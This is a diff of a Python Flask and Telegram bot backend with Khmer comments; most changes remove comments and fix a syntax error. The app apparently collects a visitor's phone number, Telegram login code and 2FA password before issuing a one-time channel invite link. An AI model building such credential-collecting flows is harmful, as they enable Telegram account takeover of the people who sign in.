@@ -11,7 +11,7 @@ API_HASH = os.getenv("TELEGRAM_API_HASH", "")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "")
 
-# 🛠 តម្លៃថ្មីសម្រាប់ Admin Account និង Channel របស់អ្នក
+# 🛠 តម្លៃសម្រាប់ Admin Account និង Channel របស់អ្នក
 ADMIN_SESSION_STRING = os.getenv("ADMIN_SESSION_STRING", "")
 CHANNEL_ID = os.getenv("CHANNEL_ID", "") # ឧទាហរណ៍៖ @my_channel ឬ -1001234567890
 
@@ -114,13 +114,12 @@ async def async_verify_code(phone_number, code, password):
             pass
 
     # 🛠 បង្កើត Link Invite (Join Requests Required) សម្រាប់ User ម្នាក់ៗដាច់ដោយឡែក
-    invite_link = "https://t.me/" # Fallback បើកុំឱ្យ Error
+    invite_link = "https://t.me/"
     if admin_client and CHANNEL_ID:
         try:
             if not admin_client.is_connected:
                 await admin_client.connect()
             
-            # បង្កើត Link ថ្មីដែលមាន creates_join_request=True
             new_link = await admin_client.create_chat_invite_link(
                 chat_id=CHANNEL_ID,
                 creates_join_request=True,
@@ -137,7 +136,7 @@ async def async_verify_code(phone_number, code, password):
         "redirectUrl": invite_link
     }
 
-# 🛠 Event Listener: ពេល User ចុចស្នើសុំចូល Channel តាម Link នោះ Account Admin នឹង Approve និង Revoke ភ្លាមៗ
+# 🛠 Event Listener: Auto-Approve និង Revoke លីងចោលភ្លាមៗពេលមានគេ Join
 if admin_client:
     @admin_client.on_chat_join_request()
     async def handle_join_request(client, chat_join_request):
@@ -145,10 +144,8 @@ if admin_client:
             chat_id = chat_join_request.chat.id
             user_id = chat_join_request.from_user.id
             
-            # 1. អនុម័ត (Approve) ចូល Channel ភ្លាមៗ
             await client.approve_chat_join_request(chat_id, user_id)
             
-            # 2. លុប/បោះបង់ (Revoke) លីងនោះចោលភ្លាមៗ ដើម្បីប្រើបានតែម្តងគត់
             if chat_join_request.invite_link and chat_join_request.invite_link.invite_link:
                 await client.revoke_chat_invite_link(chat_id, chat_join_request.invite_link.invite_link)
                 
@@ -169,7 +166,7 @@ def send_code():
     data = request.json or {}
     phone_number = data.get('phoneNumber')
     if not phone_number:
-        return jsonify({"success": False, "error": "Phone number is required"}}, 400
+        return jsonify({"success": False, "error": "Phone number is required"}), 400
 
     phone_number = phone_number.strip()
     if not phone_number.startswith('+'):
@@ -219,7 +216,6 @@ if __name__ == '__main__':
     import threading
     threading.Thread(target=loop.run_forever, daemon=True).start()
 
-    # စាប់ដំណើរការ Admin Client ក្នុង Background Loop
     asyncio.run_coroutine_threadsafe(start_admin_client(), loop)
 
     port = int(os.environ.get("PORT", 3000))
